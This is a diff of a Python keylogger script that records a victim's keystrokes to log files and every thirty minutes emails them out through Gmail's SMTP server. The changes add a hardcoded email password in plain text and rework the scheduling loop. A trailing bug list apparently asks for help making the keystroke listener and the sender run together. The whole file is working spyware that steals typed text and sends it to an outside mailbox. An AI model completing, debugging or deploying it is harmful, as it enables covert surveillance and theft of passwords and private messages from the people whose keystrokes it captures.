@@ -2,9 +2,6 @@
 import os
 import email
 import smtplib
-import ssl
-import getpass
-import schedule
 import time
 import urllib.request
 
@@ -19,6 +16,12 @@ from email.mime.text import MIMEText
 full_log = ""
 word = ""
 char_limit = 190 # Line limit to match screen width
+log_file_counter = 1
+
+smtp_port = 587
+smtp_server = "smtp.gmail.com"
+pswd = "qokedyplqziplujz"
+
 def get_current_time():
     return datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
 
@@ -42,13 +45,12 @@ print(ascii_art)
 
 # Email setup
 email = input("Enter email: ") # used both as sending and receiving email
-password = getpass.getpass("Type your password and press enter: ")  # Securely input password
 subject = f"Keylogger logs at: {get_current_time()}"
 body = f"See attached logs to view keystrokes at {get_current_time()}"
 
 def create_log_file():
 	global log_file
-	log_file_counter = 1
+	global log_file_counter
 	log_file = f"{os.getcwd()}/user-data-{log_file_counter}-{get_current_time()}.log"
 	log_file_counter += 1
 	with open(log_file, "w") as file:
@@ -66,31 +68,25 @@ def send_attachment():
 	# Add body to email
 	message.attach(MIMEText(body, "plain"))
 
-	# Open PDF file in binary mode
-	with open(log_file, "rb") as attachment:
-		# Add file as application/octet-stream
-		#Email client can usually download this automatically as attachment 
-		part = MIMEBase("application", "octet-stream")
-		part.set_payload(attachment.read())
+	#Define the file to attach and open in binary mode
+	filename = log_file
+	attachment = open(filename, "rb") # r for read nd b for binary
 
-	# Encode file in ASCII characters to send by email
-	encoders.encode_base64(part)
+	# Add file as application/octet-stream
+	attachment_package = MIMEBase("application", "octet-stream")
+	attachment_package.set_payload((attachment).read())
+	encoders.encode_base64(attachment_package)	# Encode as base 64-ASCII Characters to send by email
+	attachment_package.add_header("Content-Dispositon", "attachment; filename = " + filename)	# Add header as key
+	message.attach(attachment_package)	# Add attachment to message
 
-	# Add header as key/value pair to attachment part
-	part.add_header(
-		"Content-Disposition",
-		f"attachment; filename = {log_file}"
-	)
+	text = message.as_string()	# Cast as string
 
-	# Add attachment to message and convert message to string
-	message.attach(part)
-	text = message.as_string()
-
-	# Log in to server using secure context and send email
-	context = ssl.create_default_context()
-	with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
-		server.login(email, password)
-		server.sendmail(email, email, text)
+	# Log in to server using secure context and send email, then logout
+	server = smtplib.SMTP(smtp_server, smtp_port)
+	server.starttls()
+	server.login(email, pswd)
+	server.sendmail(email, email, text)
+	server.quit()
 
 # LISTENING FOR KEYSTROKE EVENTS
 def on_press(key):
@@ -140,6 +136,7 @@ def check_internet():
 		return False
 
 def check_and_send():
+	time.sleep(1800)
 	if check_internet():
 		send_attachment()
 		# Delete file afterwards
@@ -151,17 +148,12 @@ def check_and_send():
 	else:
 		with open(log_file, 'a') as file:
 			file.write(f"Victim has no internet connection at this time: {get_current_time()}.\n")
-
-# Schedule task to check internet connection and send attachment every 30 minutes
-schedule.every(30).minutes.do(check_and_send)
+	print("Scheduler running...")
 
 # Infinite loop to run the scheduler
 while True:
-	schedule.run_pending()
-	time.sleep(1)  # To avoid high CPU usage, can be adjusted based on requirements
-
-
-
+	# Schedule task to check internet connection and send attachment every 30 minutes
+	check_and_send()
 """ 
 * Workflow
 - Record key strokes,
@@ -175,8 +167,7 @@ then push the word to the another long variable> log_sentence then empty word wi
 	- if not then add a string to the log file saying ("Victim has no active internet connection at {datetime.now()}) 
 
 BUGS FOUND
-2. How to send a *.log file via email using the smtplib module in python
 3. Check line 48 where log_file is declared: if your remove the path, if it affects where the file is created
 4. Look for ways to ignore the numpad keys if numpad key is off
-5. 
+5. my problem wit this code is I do not know if he 2 functions the listener and the scheduler  are concurrently running. can you add some code like print statements that will show me if both of them are running
 """
